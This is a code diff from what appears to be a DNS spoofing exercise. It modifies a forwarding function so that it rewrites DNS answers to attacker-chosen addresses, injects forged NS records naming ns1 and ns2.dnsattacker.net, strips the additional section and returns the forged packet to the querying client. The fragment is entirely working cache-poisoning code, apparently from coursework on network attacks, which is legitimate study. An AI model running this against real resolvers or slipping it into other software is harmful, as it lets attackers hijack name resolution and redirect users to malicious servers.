@@ -65,22 +65,14 @@ def forward_to_dns(data, serv, dig_addr, dig_port):
         domain_name = dns_pkt[DNSQR].qname
         print("domain name", domain_name)
         # modify dns response addr
-        dns_pkt[DNS].an = DNSRR(rrname=domain_name, rdata=DNS_HOSTS[domain_name])
+        dns_pkt[DNS].an = DNSRR(rrname=domain_name, type='A', rdata=DNS_HOSTS[domain_name])
         dns_pkt[DNS].ancount = 1
         # modify dns response nameserver
-        # dns_pkt[DNS].ns = DNSRRNSEC(rrname=SPROOF_NS_1)
+        dns_pkt[DNS].ns = DNSRR(rrname=domain_name, type='NS', rdata="ns1.dnsattacker.net")/DNSRR(rrname=domain_name, type='NS', rdata="ns2.dnsattacker.net")
+        dns_pkt[DNS].nscount = 2
         # delete additional section
-        dns_pkt[DNS].arcount = 0 
+        dns_pkt[DNS].arcount = 0
 
-        # response_data = response_data[:len(response_data) // 2]
-        # packet = scapy.packet.Packet()
-        # packet.add_payload(response_data)
-        # print(response_data.decode("ASCII"))
-
-        # packet = IP(saddr, daddr)/UDP(sport, pport)/ DNS(id=pkt[DNS].id, qr=1, qd=DNSQR(qname=pkt[DNSQR].qname), \
-        #                         an=DNSRR(rrname="example.com", rdata = local_ip))
-
-        # response_data["ipv4 address"] = "ns2.utoronto.ca"
         serv.sendto(bytes(dns_pkt), (dig_addr, dig_port))
     client.close()
 
